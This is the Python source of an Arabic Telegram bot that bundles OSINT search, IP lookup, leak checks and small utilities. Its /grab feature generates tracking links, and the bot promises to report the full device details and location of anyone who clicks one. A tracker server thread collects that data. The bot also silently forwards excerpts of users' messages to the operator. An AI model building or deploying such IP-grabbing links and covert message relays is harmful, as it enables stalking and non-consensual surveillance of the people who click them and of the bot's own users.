# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات الأزرار والرسائل
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

SUPPORT_INFO = (
    "```\n"
    "┌─────────────────────────┐\n"
    "│   📞  الدعم والتواصل    │\n"
    "└─────────────────────────┘\n"
    "```\n"
    "إذا واجهت أي مشكلة أو لديك استفسار، يمكنك التواصل مع المطور مباشرة عبر الواتساب.\n\n"
    "👤 *المطور:* راشد خليل أبو زيتونه\n"
    "📱 *واتساب:* +962775866283\n\n"
    "✦ راشد"
)

BUTTON_RESPONSES = {
    "cb_ai": (
        f"{title_of('ai')}\n"
        "أنا الآن في وضع الاستعداد. أرسل أي سؤال أو موضوع وسأجيبك فوراً مع البحث في الإنترنت إذا لزم الأمر.\n\n"
        "⚡ +10 نقاط XP"
    ),
    "cb_code": (
        f"{title_of('code')}\n"
        "أرسل الكود مباشرةً وسأقوم بـ:\n"
        "› شرح ما يفعله الكود\n"
        "› كشف الأخطاء والمشاكل\n"
        "› اقتراح تحسينات\n"
        "› كتابة الكود المصحّح\n\n"
        "⚡ +10 نقاط XP"
    ),
    "cb_osint": (
        f"{title_of('osint')}\n"
        "الأمر: /osint\n\n"
        "أو أرسل مباشرةً:\n`/osint اسم شخص أو موضوع`\n\n"
        "يجمع معلومات من مصادر متعددة على الإنترنت.\n"
        "⚡ +10 نقاط XP"
    ),
    "cb_tools": (
        f"{title_of('tools')}\n"
        "🔑 /generate — كلمة مرور آمنة فورية\n"
        "🔒 /strong — فحص قوة كلمة المرور\n"
        "📱 /qr — صانع QR Code\n"
        "🧩 /texttools — تشفير Base64 + Morse\n"
        "🎂 /age — حاسبة العمر\n"
        "🔢 /count — عداد النص\n"
        "⏰ /remind — تذكير بعد دقائق\n\n"
        "اكتب الأمر مباشرةً وسيستجيب فوراً!\n"
        "⚡ +10 نقاط XP لكل استخدام"
    ),
    "cb_play": (
        f"{title_of('game')}\n"
        "🎲 *لعبة تخمين الرقم*\n\n"
        "اختر رقماً من 1 إلى 100\n"
        "وكلما قلّت محاولاتك كلما ربحت نقاط XP أكثر!\n\n"
        "ابدأ الآن: اكتب رقمك أو استخدم زر *العب* أدناه ⬇️",
    ),
    "cb_profile": None,
    "cb_news": None,
    "cb_help": None,
    "cb_support": None,
}


async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user  = query.from_user
    await query.answer()
    data  = query.data
    # لا تمتص أزرار الإرسال الجماعي — معالجها المتخصص (cb_broadcast_confirm) هو من يعالجها
    if data in ("cb_tools_gen", "cb_tools_text", "cb_play_start"):
        pass  # معالجوهما المتخصصون أدناه
    elif data.startswith(("cb_broadcast_", "cb_tools_", "cb_play_")):
        return
    back_kb = InlineKeyboardMarkup([[InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")]])

    if data == "cb_support":
        support_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("💬 واتساب", url="https://wa.me/962775866283")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(SUPPORT_INFO, parse_mode="Markdown", reply_markup=support_kb)
        return

    if data == "cb_help":
        is_admin = user.id == ADMIN_ID
        text = (
            "```\n"
            "┌─────────────────────────┐\n"
            "│   📖  قائمة الأوامر     │\n"
            "└─────────────────────────┘\n"
            "```\n"
            "/start — تشغيل النظام\n"
            "/osint — بحث OSINT\n"
            "/user — بحث مستخدم\n"
            "/ip — تحليل IP\n"
            "/scan — فحص رابط\n"
            "/whois — فحص Whois\n"
            "/grab — رابط سحب IP\n"
            "/mylogs — سجلاتي\n"
            "/clear — مسح ذاكرة المحادثة\n"
            "/support — الدعم والتواصل\n"
            "/help — المساعدة"
        )
        if is_admin:
            text += "\n\n*أوامر المدير:*\n/stats — الإحصائيات\n/vt — VirusTotal"
        await query.edit_message_text(text, parse_mode="Markdown", reply_markup=back_kb)
        return

    if data == "cb_back":
        await query.edit_message_text(
            "اختر من القائمة أدناه 👇",
            reply_markup=build_main_keyboard(user.id == ADMIN_ID)
        )
        return

    if data.startswith("cb_grab_"):
        page_type = data.replace("cb_grab_", "")
        label = pending_grabs.get(user.id, "رابط عام")
        url = generate_grab_link(user.id, label, page_type)
        msg = (
            f"✅ *تم إنشاء الرابط بنجاح!*\n\n"
            f"🔗 الرابط:\n`{url}`\n\n"
            f"📝 التفاصيل:\n"
            f"• النوع: {PAGE_TYPES.get(page_type, page_type)}\n"
            f"• التسمية: {label}\n\n"
            f"⚠️ عند ضغط أي شخص على الرابط:\n"
            f"ستصلك تفاصيل كاملة عن جهازه وموقعه!"
        )
        await query.edit_message_text(msg, parse_mode="Markdown")
        pending_grabs.pop(user.id, None)
        return

    if data == "cb_profile":
        card = profile_card(user, load_users())
        await query.edit_message_text(card, parse_mode="Markdown", reply_markup=back_kb)
        add_xp(user.id, 2)
        return

    if data == "cb_news":
        typing_msg = await query.message.reply_text("📰 جارٍ تجهيز نشرة الأخبار...")
        try:
            report = daily_news_report()
            await typing_msg.delete()
            await query.edit_message_text(report, parse_mode="Markdown", reply_markup=back_kb)
        except Exception:
            await typing_msg.delete()
            await query.edit_message_text("⚠️ تعذر جلب الأخبار الآن — أعد المحاولة بعد قليل.", reply_markup=back_kb)
        add_xp(user.id, 5)
        return

    if data == "cb_tools":
        tools_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 مولّد كلمات مرور", callback_data="cb_tools_gen")],
            [InlineKeyboardButton("🧩 أدوات النصوص", callback_data="cb_tools_text")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(BUTTON_RESPONSES["cb_tools"], parse_mode="Markdown", reply_markup=tools_kb)
        return

    if data == "cb_tools_gen":
        pending_states[user.id] = "gen_pass"
        await query.edit_message_text(
            "🔑 *أرسل طول الكلمة* (8–64)، مثلاً: `16`\n\n"
            "وإذا أردت تعقيداً أكبر أضف كلمة، مثلاً: `20 Rashd`",
            parse_mode="Markdown",
            reply_markup=back_kb,
        )
        return

    if data == "cb_tools_text":
        pending_states[user.id] = "texttools"
        await query.edit_message_text(
            "🧩 *أرسل النص* الذي تريد تحويله:\n\n"
            "سأجيبك بتشفير Base64 + Morse + معكوس النص + العداد",
            parse_mode="Markdown",
            reply_markup=back_kb,
        )
        return

    if data == "cb_play":
        play_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎲 ابدأ اللعبة", callback_data="cb_play_start")],
            [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
        ])
        await query.edit_message_text(BUTTON_RESPONSES["cb_play"], parse_mode="Markdown", reply_markup=play_kb)
        return

    if data == "cb_play_start":
        result = game_start(user.id)
        add_xp(user.id, 3)
        await query.edit_message_text(result, parse_mode="Markdown", reply_markup=back_kb)
        return

    response = BUTTON_RESPONSES.get(data)
    if response:
        if data == "cb_ai":
            pending_states[user.id] = "ai"
        elif data == "cb_code":
            pending_states[user.id] = "code"
        elif data == "cb_osint":
            pending_states[user.id] = "osint"
        elif data == "cb_scan":
            pending_states[user.id] = "vt"
            await query.edit_message_text("🔬 أرسل الرابط الذي تريد فحصه أمنياً:", reply_markup=back_kb)
            return
        elif data == "cb_ip":
            pending_states[user.id] = "ip_state"
            await query.edit_message_text("🌐 أرسل عنوان الـ IP لتحليله:", reply_markup=back_kb)
            return
        elif data == "cb_user":
            pending_states[user.id] = "osint"
            await query.edit_message_text("👤 أرسل اسم المستخدم أو الشخص للبحث عنه:", reply_markup=back_kb)
            return
        elif data == "cb_whois":
            pending_states[user.id] = "osint"
            await query.edit_message_text("🔎 أرسل النطاق (Domain) لفحص الـ Whois:", reply_markup=back_kb)
            return
        elif data == "cb_leakcheck":
            pending_states[user.id] = "leakcheck"
            await query.edit_message_text("🔍 أرسل البريد أو الرقم لفحص التسريبات:", reply_markup=back_kb)
            return
        
        await query.edit_message_text(response, parse_mode="Markdown", reply_markup=back_kb)


def is_code_block(text: str) -> bool:
    return "```" in text or text.strip().startswith("def ") or text.strip().startswith("class ")


async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_msg = update.message.text or ""

    register_user(user)

    state = pending_states.get(user.id)

    if state == "ai":
        if user.id != ADMIN_ID:
            notify_control(user, f"سؤال AI: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")
        reply = ask_groq(user.id, user_msg, use_internet=True)
        await typing_msg.delete()
        await update.message.reply_text(reply, parse_mode="Markdown")
        return

    if state == "code":
        if user.id != ADMIN_ID:
            notify_control(user, f"تحليل كود: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("💻 جاري تحليل الكود...")
        result = analyze_code(user_msg)
        await typing_msg.edit_text(result, parse_mode="Markdown")
        return

    if state == "osint":
        if user.id != ADMIN_ID:
            notify_control(user, f"بحث OSINT: {user_msg[:50]}")
        typing_msg = await update.message.reply_text("🔍 جاري البحث...")
        result = cmd_osint_search(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown", disable_web_page_preview=True)
        pending_states.pop(user.id, None)
        return

    if state == "ip_state":
        typing_msg = await update.message.reply_text("🌐 جاري تحليل الـ IP...")
        result = analyze_ip(user_msg.strip())
        await typing_msg.edit_text(result, parse_mode="Markdown")
        pending_states.pop(user.id, None)
        return

    if state == "leakcheck":
        context.args = [user_msg]
        pending_states.pop(user.id, None)
        await cmd_leakcheck(update, context)
        return

    if state == "vt":
        context.args = [user_msg]
        pending_states.pop(user.id, None)
        await cmd_vt(update, context)
        return

    if state == "gen_pass":
        try:
            parts = user_msg.split()
            length = int(parts[0]) if parts[0].isdigit() else 16
        except Exception:
            length = 16
        pw = generate_password(length)
        strength, advice = password_strength(pw)
        add_xp(user.id, 10)
        pending_states.pop(user.id, None)
        await update.message.reply_text(
            "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃  🔑  كلمتك السرية      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"```\n{pw}\n```\n\n"
            f"💪 *القوة:* {strength}\n"
            f"💡 {advice}\n\n"
            f"⚡ ربحت 10 نقاط XP\n"
            f"{DIVIDER}\n✦ راشد",
            parse_mode="Markdown",
        )
        return

    if state == "texttools":
        report = text_tools_report(user_msg)
        add_xp(user.id, 10)
        pending_states.pop(user.id, None)
        await update.message.reply_text(report, parse_mode="Markdown")
        return

    if state == "age":
        report = age_report(user_msg)
        pending_states.pop(user.id, None)
        if report is None:
            await update.message.reply_text(
                "⚠️ لم أتمكن من قراءة التاريخ. أرسله بهذا الشكل:\n`15/08/1999`\nأو `15-08-2000`",
                parse_mode="Markdown",
            )
            return
        add_xp(user.id, 10)
        await update.message.reply_text(
            "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
            "┃   🎂  حاسبة العمر      ┃\n"
            "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
            f"{report}",
            parse_mode="Markdown",
        )
        return

    if state == "game":
        result = game_guess(user.id, user_msg)
        await update.message.reply_text(result, parse_mode="Markdown")
        # لا تفرغ الحالة هنا — اللعبة تنتهي عند الفوز داخل game_guess
        if "مبروك" in result:
            pending_states.pop(user.id, None)
        return

    if state == "qr":
        text = user_msg.strip()
        if not text:
            pending_states.pop(user.id, None)
            await update.message.reply_text("⚠️ اكتب النص أو الرابط الذي تريد تحويله إلى QR:")
            return
        try:
            buf = make_qr_image(text)
            add_xp(user.id, 10)
            pending_states.pop(user.id, None)
            await update.message.reply_photo(
                photo=buf, caption="📱 *QR Code جاهز!*\n⚡ +10 نقاط XP", parse_mode="Markdown",
            )
        except Exception:
            pending_states.pop(user.id, None)
            await update.message.reply_text("⚠️ تعذر توليد الصورة — أعد المحاولة.")
        return

    if state == "broadcast_confirm":
        if user.id == ADMIN_ID and user_msg.lower() in ("نعم", "نعم ارسل", "ارسل"):
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ نعم، أرسل للجميع", callback_data="cb_broadcast_yes")],
                [InlineKeyboardButton("❌ إلغاء", callback_data="cb_broadcast_no")],
            ])
            msg_text = context.user_data.get("pending_broadcast", "")
            await update.message.reply_text(
                f"📢 *معاينة الرسالة الجماعية:*\n\n{msg_text[:500]}\n\n"
                "هل تريد إرسالها لجميع المستخدمين؟",
                parse_mode="Markdown",
                reply_markup=kb,
            )
            return
        pending_states.pop(user.id, None)
        context.user_data.pop("pending_broadcast", None)
        await update.message.reply_text("🚫 تم إلغاء الإرسال الجماعي.")
        return

    if user.id != ADMIN_ID:
        notify_control(user, f"رسالة: {user_msg[:80]}")

        typing_msg = await update.message.reply_text("⏳ جاري المعالجة...")
    if is_code_block(user_msg):
        reply = analyze_code(user_msg)
    else:
        reply = ask_groq(user.id, user_msg, use_internet=True)
    add_xp(user.id, 10)
    await typing_msg.delete()
    await update.message.reply_text(reply, parse_mode="Markdown")


async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user    = update.effective_user
    caption = update.message.caption or "صف ما تراه في الصورة بالتفصيل"
    try:
        msg     = await update.message.reply_text("🖼️ جاري تحليل الصورة...")
        photo   = update.message.photo[-1]
        file    = await context.bot.get_file(photo.file_id)
        img_bytes = bytes(await file.download_as_bytearray())
        result  = analyze_image_groq(img_bytes, caption)
        await msg.edit_text(result, parse_mode="Markdown")
        if user.id != ADMIN_ID:
            notify_control(user, "أرسل صورة للتحليل")
    except Exception as e:
        logging.exception("خطأ في معالجة الصورة")
        await update.message.reply_text("❌ حدث خطأ أثناء تحليل الصورة. أعد المحاولة لاحقاً.")


async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    """معالج الأخطاء المركزي — يمنع توقف البوت عند أي استثناء غير متوقع."""
    err = context.error
    logging.exception("استثناء غير معالَج: %s", err)
    if isinstance(update, Update) and update.effective_message:
        try:
            await update.effective_message.reply_text(
                "⚠️ حدث خطأ غير متوقع أثناء معالجة طلبك. أعد المحاولة."
            )
        except Exception:
            pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🚀  تشغيل البوت
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def register_bot_commands():
    """تحديث قائمة أوامر البوت في Telegram (زر القائمة)."""
    commands = [
        {"command": "start",      "description": "تشغيل النظام"},
        {"command": "osint",      "description": "بحث OSINT على الإنترنت"},
        {"command": "grab",       "description": "توليد رابط سحب IP"},
        {"command": "mylogs",     "description": "عرض سجلات روابطك"},
        {"command": "leakcheck",  "description": "فحص التسريبات"},
        {"command": "clear",      "description": "مسح ذاكرة المحادثة"},
        {"command": "support",    "description": "الدعم والتواصل"},
        {"command": "broadcast",  "description": "إرسال جماعي (المدير)"},
        {"command": "profile",    "description": "بطاقتك ومستواك ونقاطك"},
        {"command": "play",       "description": "لعبة تخمين الرقم (+XP)"},
        {"command": "tools",      "description": "صندوق الأدوات الذكية"},
        {"command": "generate",   "description": "كلمة مرور آمنة فورية"},
        {"command": "strong",     "description": "فحص قوة كلمة المرور"},
        {"command": "qr",         "description": "صانع QR Code"},
        {"command": "texttools",  "description": "Base64 + Morse + عداد"},
        {"command": "age",        "description": "حاسبة العمر"},
        {"command": "count",      "description": "عدّاد النص"},
        {"command": "remind",     "description": "تذكير بعد دقائق"},
        {"command": "news",       "description": "نشرة أخبار اليوم"},
        {"command": "help",       "description": "قائمة الأوامر"},
    ]
    try:
        resp = requests.post(
            f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/setMyCommands",
            json={"commands": commands},
            timeout=10,
        )
        if resp.ok:
            print("✅ قائمة الأوامر حُدِّثت في Telegram")
        else:
            print(f"⚠️ فشل تحديث قائمة الأوامر: {resp.text}")
    except Exception as e:
        print(f"⚠️ خطأ في setMyCommands: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  📢  لوحة الإرسال الجماعي (زر المدير)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🆕  أوامر الأدوات الذكية v3
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def cmd_profile(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    card = profile_card(user, load_users())
    add_xp(user.id, 2)
    await update.message.reply_text(card, parse_mode="Markdown")

async def cmd_generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    try:
        length = int(context.args[0]) if context.args else 16
    except Exception:
        length = 16
    pw = generate_password(length)
    strength, advice = password_strength(pw)
    add_xp(user.id, 10)
    await update.message.reply_text(
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🔑  كلمتك السرية      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"```\n{pw}\n```\n\n"
        f"💪 *القوة:* {strength}\n"
        f"💡 {advice}\n\n"
        f"⚡ +10 نقاط XP\n{DIVIDER}\n✦ راشد",
        parse_mode="Markdown",
    )

async def cmd_strong(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    pw = " ".join(context.args) if context.args else ""
    if not pw:
        await update.message.reply_text("🔒 أرسل كلمة المرور بعد الأمر، مثلاً:\n`/strong MyPass2026!`", parse_mode="Markdown")
        return
    strength, advice = password_strength(pw)
    await update.message.reply_text(
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🔒  فحص قوة كلمة المرور│\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"💪 *القوة:* {strength}\n💡 {advice}",
        parse_mode="Markdown",
    )

async def cmd_qr(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = " ".join(context.args) if context.args else ""
    if not text:
        pending_states[user.id] = "qr"
        await update.message.reply_text("📱 *أرسل الآن النص أو الرابط* الذي تريد تحويله إلى QR Code:\n\nمثال: `https://example.com`", parse_mode="Markdown")
        return
    buf = make_qr_image(text)
    add_xp(user.id, 10)
    await update.message.reply_photo(
        photo=buf, caption="📱 *QR Code جاهز!*\n⚡ +10 نقاط XP", parse_mode="Markdown",
    )

async def cmd_texttools(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = " ".join(context.args) if context.args else ""
    if not text:
        pending_states[user.id] = "texttools"
        await update.message.reply_text("🧩 *أرسل النص* الذي تريد تحويله:\n\nسأجيبك بـ Base64 + Morse + معكوس النص + العداد", parse_mode="Markdown")
        return
    report = text_tools_report(text)
    add_xp(user.id, 10)
    await update.message.reply_text(report, parse_mode="Markdown")

async def cmd_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    text = " ".join(context.args) if context.args else ""
    if not text:
        pending_states[user.id] = "age"
        await update.message.reply_text("🎂 *أرسل تاريخ ميلادك* بهذا الشكل:\n`15/08/1999`\nأو `15-08-2000`", parse_mode="Markdown")
        return
    report = age_report(text)
    if report is None:
        await update.message.reply_text("⚠️ لم أتمكن من قراءة التاريخ. أرسله بهذا الشكل:\n`15/08/1999`", parse_mode="Markdown")
        return
    add_xp(user.id, 10)
    await update.message.reply_text(
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃   🎂  حاسبة العمر      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        f"{report}",
        parse_mode="Markdown",
    )

async def cmd_play(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    result = game_start(user.id)
    pending_states[user.id] = "game"
    add_xp(user.id, 3)
    await update.message.reply_text(result, parse_mode="Markdown")

async def cmd_remind(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args or []
    if not args or not args[0].isdigit():
        await update.message.reply_text(
            "⏰ *طريقة الاستخدام:*\n`/remind 10 اجتماع مع العميل`\n\n"
            "رقم الدقائق (1–1440) ثم ملاحظة اختيارية.",
            parse_mode="Markdown",
        )
        return
    minutes = max(1, min(1440, int(args[0])))
    note = " ".join(args[1:]) or "تذكير عام من راشد ⏰"
    schedule_reminder(context.bot, user.id, minutes, note)
    await update.message.reply_text(
        f"✅ *تم ضبط التذكير!*\n\n"
        f"⏰ بعد `{minutes} دقيقة`\n📌 {note[:100]}",
        parse_mode="Markdown",
    )

async def cmd_news(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    typing_msg = await update.message.reply_text("📰 جارٍ تجهيز نشرة الأخبار...")
    try:
        report = daily_news_report()
        await typing_msg.delete()
        await update.message.reply_text(report, parse_mode="Markdown")
    except Exception:
        await typing_msg.delete()
        await update.message.reply_text("⚠️ تعذر جلب الأخبار الآن — أعد المحاولة بعد قليل.")
    add_xp(user.id, 5)

async def cmd_tools(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    tools_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("🔑 مولّد كلمات مرور", callback_data="cb_tools_gen")],
        [InlineKeyboardButton("🧩 أدوات النصوص", callback_data="cb_tools_text")],
        [InlineKeyboardButton("↩️ رجوع", callback_data="cb_back")],
    ])
    await update.message.reply_text(
        "┏━━━━━━━━━━━━━━━━━━━━━━┓\n"
        "┃  🧰  صندوق الأدوات      ┃\n"
        "┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
        "🔑 /generate [طول] — كلمة مرور آمنة\n"
        "🔒 /strong [كلمة] — فحص القوة\n"
        "📱 /qr [نص] — صانع QR\n"
        "🧩 /texttools [نص] — Base64 + Morse\n"
        "🎂 /age [تاريخ] — حاسبة العمر\n"
        "🔢 /count [نص] — عداد النص\n"
        "⏰ /remind [دقائق] — تذكير\n"
        "📰 /news — أخبار اليوم\n\n"
        "أو اضغط زر أحد أدناه ⬇️",
        parse_mode="Markdown",
        reply_markup=tools_kb,
    )


async def _cb_broadcast_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """زر '📢 إرسال جماعي' في لوحة المدير — يطلب من المدير كتابة النص"""
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        await query.answer("⛔ هذا الإجراء للمدير فقط.", show_alert=True)
        return
    await query.answer()
    pending_states[query.from_user.id] = "broadcast_confirm"
    context.user_data.pop("pending_broadcast", None)
    await query.message.reply_text(
        "📢 *اكتب الآن نص الرسالة الجماعية* في رسالة واحدة،\n"
        "وسيعرض لك معاينة لتأكيد الإرسال.\n\n"
        "ملاحظة: يستقبلها كل مستخدم جرّب البوت، ومن حجب البوت سيفشل إرساله تلقائياً.",
        parse_mode="Markdown",
    )


def main():
    logging.info("🚀 بداية تشغيل main_bot.py — الإصدار v3.1 مع watchdog")
    # تشغيل خادم التعقب في خيط منفصل
    tracker_thread = threading.Thread(target=start_tracker_server, daemon=False)
    tracker_thread.start()
    print("📡 خادم التعقب يعمل في خيط منفصل...")
    logging.info("📡 خادم التعقب بدأ في خيط منفصل")
    
    # تشغيل البوت الرئيسي
    if not MAIN_BOT_TOKEN:
        logging.error("⛔ MAIN_BOT_TOKEN غير معرّف — البوت لن يعمل بدون التوكن")
        raise RuntimeError("MAIN_BOT_TOKEN missing")
    app = Application.builder().token(MAIN_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("grab",     cmd_grab))
    app.add_handler(CommandHandler("mylogs",   cmd_mylogs))
    app.add_handler(CommandHandler("clear",    cmd_clear))
    app.add_handler(CommandHandler("stats",    cmd_stats))
    app.add_handler(CommandHandler("broadcast",cmd_broadcast))
    app.add_handler(CommandHandler("scan",     cmd_vt))
    app.add_handler(CommandHandler("vt",       cmd_vt))
    app.add_handler(CommandHandler("leakcheck",cmd_leakcheck))
    app.add_handler(CommandHandler("support", cmd_help)) # Redirect to help or custom
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    register_bot_commands()
    app.add_handler(CommandHandler("osint",  _fallback_osint))
    app.add_handler(CommandHandler("user",   _fallback_user))
    app.add_handler(CommandHandler("ip",     _fallback_ip))
    app.add_handler(CommandHandler("whois",  _fallback_whois))
    app.add_handler(CommandHandler("profile",    cmd_profile))
    app.add_handler(CommandHandler("play",       cmd_play))
    app.add_handler(CommandHandler("tools",      cmd_tools))
    app.add_handler(CommandHandler("generate",   cmd_generate))
    app.add_handler(CommandHandler("strong",     cmd_strong))
    app.add_handler(CommandHandler("qr",         cmd_qr))
    app.add_handler(CommandHandler("texttools",  cmd_texttools))
    app.add_handler(CommandHandler("age",        cmd_age))
    app.add_handler(CommandHandler("count",      cmd_texttools))
    app.add_handler(CommandHandler("remind",     cmd_remind))
    app.add_handler(CommandHandler("news",       cmd_news))
    # المعالجات المتخصصة يجب أن تُسجَّل **قبل** المعالج العام؛ PTB ينفّذ أول معالج مطابق
    # والمتخصص هنا هو: أي زر ليس cb_back/دعم/مساعدة/أزرار القائمة العامة يُترك لهذا المعالج
    app.add_handler(CallbackQueryHandler(_cb_unhandled, pattern="^cb_(scan|ip|user|whois|leakcheck|mylogs|clear|vt|stats|grab)$"))
    app.add_handler(CallbackQueryHandler(_cb_broadcast_panel, pattern="^cb_broadcast_panel$"))
    app.add_handler(CallbackQueryHandler(_cb_broadcast_confirm, pattern="^cb_broadcast_(yes|no)$"))
    # معالج الأزرار العام (الأخير): يغطي cb_ai/cb_code/cb_osint/cb_help/cb_support/cb_back/cb_grab_* فقط
    app.add_handler(CallbackQueryHandler(button_handler))

    # معالج الأخطاء المركزي
    app.add_error_handler(error_handler)

    # مراقبة صحة التشغيل: فحص دوري للويب هوك/التحديثات
    monitor_thread = threading.Thread(target=_self_health_monitor, daemon=True)
    monitor_thread.start()
    print("🩺 مراقب الصحة الذاتي يعمل (فحص كل 5 دقائق)")
    logging.info("🩺 مراقب الصحة الذاتي بدأ — فحص كل 5 دقائق")
    logging.info("✅ كل الإعدادات مكتملة — الدخول إلى حلقة polling الآن")
    logging.info("🤖 البوت: %s | المستخدمون: %d", MAIN_BOT_TOKEN.split(":")[0], get_users_count())

    print("✅ قائمة الأوامر حُدِّثت في Telegram")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"⚡ راشد الاستخباراتي v3.0 — يعمل الآن")
    print(f"🤖 البوت: {MAIN_BOT_TOKEN.split(':')[0]}")
    print(f"👥 المستخدمون المسجّلون: {get_users_count()}")
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

    # حلقة تشغيل مستقرة: عند أي تعطل يعيد الاتصال تلقائياً
    # timeout=60 يجلب تحديثات كل دقيقة — مفيد على الاستضافات المجانية التي توقف العمليات الخاملة
    # retry_official=True: تتعامل مع تعارض 409 (نسخة أخرى من البوت) بإعادة المحاولة بدل الموت
    # drop_pending_updates=True عند إعادة المحاولة فقط: نتخلى عن تحديثات قديمة مكدسة قد تسبب تعارضًا مستمرًا
    _first_attempt = True
    while True:
        try:
            asyncio.run(
                app.run_polling(
                    poll_interval=1.0,
                    timeout=60,
                    bootstrap_retries=-1,
                    allowed_updates=Update.ALL_TYPES,
                    drop_pending_updates=not _first_attempt,
                    retry_official=True,
                )
            )
        except KeyboardInterrupt:
            logging.warning("⛔ استُقبل إيقاف من النظام (KeyboardInterrupt)")
            break
        except Exception as e:
            err_text = str(e).lower()
            _is_conflict = "conflict" in err_text
            _wait = 60 if _is_conflict else 10
            logging.exception("polling انقطع: %s", e)
            print(f"⚠️ انقطع الاتصال بـ polling: {e} — إعادة المحاولة بعد {_wait} ثانية{' (تعارض: هناك نسخة أخرى من البوت)' if _is_conflict else ''}...")
            time.sleep(_wait)
        _first_attempt = False


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🩺  مراقب الصحة الذاتي | Self Health Monitor
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def _self_health_monitor():
    """يتأكد كل 5 دقائق أن البوت يستجيب لواجهة تلغرام؛ إن لم يستجب يوقف نفسه
    حتى يقوم نظام إدارة العمليات (systemd / run.sh / الاستضافة) بإعادة تشغيله."""
    while True:
        time.sleep(300)
        try:
            r = requests.get(
                f"https://api.telegram.org/bot{MAIN_BOT_TOKEN}/getMe", timeout=15
            )
            if r.status_code != 200 or not r.json().get("ok"):
                print("🚨 فشل التحقق من واجهة تلغرام — إيقاف العملية لإعادة التشغيل")
                logging.error("health check failed: status=%s body=%s", r.status_code, r.text[:200])
                os._exit(1)
        except Exception as e:
            logging.error("خطأ في فحص الصحة: %s", e)
            os._exit(1)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  🔘  معالجات أوامر الأزرار غير المسجلة بالأوامر
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def _fallback_osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = " ".join(context.args) if context.args else ""
    if not query:
        await update.message.reply_text(
            "👤 أرسل اسم المستخدم أو الشخص للبحث عنه:\n`/osint اسم الشخص`",
            parse_mode="Markdown",
        )
        return
    pending_states[update.effective_user.id] = "osint"
